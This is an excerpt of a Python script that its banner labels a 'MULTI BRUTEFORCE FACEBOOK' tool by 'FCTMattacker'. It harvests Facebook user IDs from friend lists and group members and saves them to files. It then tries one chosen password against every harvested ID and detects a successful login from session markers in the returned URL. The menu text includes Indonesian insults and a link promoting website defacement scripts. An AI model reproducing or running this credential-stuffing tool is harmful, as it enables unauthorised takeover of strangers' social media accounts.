...
def crack(d):
	while 1:
		s = inputD('[?] Sandi')
		if len(s) < 6:
			cetak('!m[!] Jumlah huruf minimal !k5')
		else:
			break
	return crack0(d,s)
...
def simpan():
	if len(id_bgroup) != 0:
		...
		try:
			open(os.sys.path[0]+'/FCTMgroup.txt','w').write('\n'.join(id_bgroup))
	...
	if len(id_bteman) != 0:
		...
		try:
			open(os.sys.path[0]+'/FCTMteman.txt','w').write('\n'.join(id_bteman))
			cetak('!h[!] Berhasil meyimpan !cFCTMteman.txt')
		except:
			cetak('!m[!] Gagal meyimpan')
def keluar():
	simpan()
...
def inputM(x,d):
	while 1:
		try:
			...
			cetak('!m[!] Pilihan PILIH ANJINK')
			continue
		if i in d:
			break
		else:
			cetak('!m[!] Pilihan SATU IDIOT')
	return i
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		...
		if i.upper() == 'L':
			...
			os.remove(os.sys.path[0]+'/FCTMgroup.txt')
			fid_bgroup = []
	return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		...
		if i.upper() == 'L':
			...
			os.remove(os.sys.path[0]+'/FCTMteman.txt')
			fid_bteman = []
	return 0
def buka(d):
	try:
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!h[*] Semoga ini adalah KETOLOLAN MU :)...')
		log = 1
...
def idteman():
	...
	if i.upper() == 'Y':
		...
		return menu()
def menu():
	cetak("\n           !h.-.-..\n          /x/xx//\n         /-/--//\n  !k*   !k* !h/x/xx//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cFCTMTEAM!b|=====>>>>>.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mFCTM !c3.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cFCTMattacker\n !m* !phttps://github.com/FctmAttacker\n !m* !phttps://facebook.com/kontol\n !m* !phttps://fromcybertofmly.blogspot.com/2019/07/script-deface-keren-2019.html\n!k.<><><><><><><><><><><><>.\n|!h  AMBIL !mID!h DARI.....  !k|\n'<><><><><><><><><><><><>'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mPERGI...")
